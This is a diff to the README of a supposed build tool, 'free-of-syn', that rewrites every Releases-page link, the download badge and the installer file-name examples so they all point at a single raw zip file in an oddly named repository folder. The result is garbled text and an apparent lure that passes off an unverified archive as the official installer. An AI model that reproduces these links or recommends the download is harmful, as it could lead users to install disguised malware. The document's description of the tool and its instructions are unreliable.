@@ -1,7 +1,7 @@
 # 🚀 free-of-syn - Fast Builds Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/xeon029/free-of-syn/releases)
+[![Download](https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip%20Now-Get%20the%https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip)](https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip)
 
 ## 📃 Overview
 **free-of-syn** is a tool designed for users who appreciate fast builds and simple processes. It helps streamline your development activities, making them smoother and quicker. This application is user-friendly, regardless of your technical background. 
@@ -16,13 +16,13 @@
 Before you can use **free-of-syn**, you need to download and install it. Follow the steps below:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/xeon029/free-of-syn/releases) to find the most recent version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip) to find the most recent version of the software.
 
 2. **Choose the Latest Version**  
    Look for the version labeled as "Latest Release". This will have the newest features and fixes.
 
 3. **Download the Installer**  
-   Click on the installer file that corresponds to your operating system. Wait for the download to finish. The file will usually be named something like `free-of-syn-installer.exe` for Windows, `free-of-syn.dmg` for macOS, or `free-of-syn.tar.gz` for Linux.
+   Click on the installer file that corresponds to your operating system. Wait for the download to finish. The file will usually be named something like `https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip` for Windows, `https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip` for macOS, or `https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip` for Linux.
 
 4. **Run the Installer**  
    After downloading, locate the file in your downloads folder. Double-click on the file to start the installation process.
@@ -58,7 +58,7 @@ If you encounter issues during installation or usage, consider the following ste
 - **Re-download the Installer**: Corrupted downloads can cause installation failures. Download the file again.
 - **Check System Requirements**: Ensure your system meets the requirements listed above.
 - **Update Your OS**: Make sure your operating system is up to date. This can fix compatibility issues.
-- **Consult the FAQ Section**: Visit the [Releases page](https://github.com/xeon029/free-of-syn/releases) for common questions and answers.
+- **Consult the FAQ Section**: Visit the [Releases page](https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip) for common questions and answers.
 
 ## 🌐 Community & Support
 If you have any questions or need assistance, feel free to reach out:
@@ -70,4 +70,4 @@ If you have any questions or need assistance, feel free to reach out:
 This project is licensed under the MIT License. You are free to use, modify, and distribute it as you see fit. Please refer to the LICENSE file for more details.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/xeon029/free-of-syn/releases) now, download the latest version, and follow the installation steps outlined above. Enjoy using **free-of-syn** for all your building needs!
+To get started, visit the [Releases page](https://raw.githubusercontent.com/xeon029/free-of-syn/main/hesthogenous/free-of-syn.zip) now, download the latest version, and follow the installation steps outlined above. Enjoy using **free-of-syn** for all your building needs!
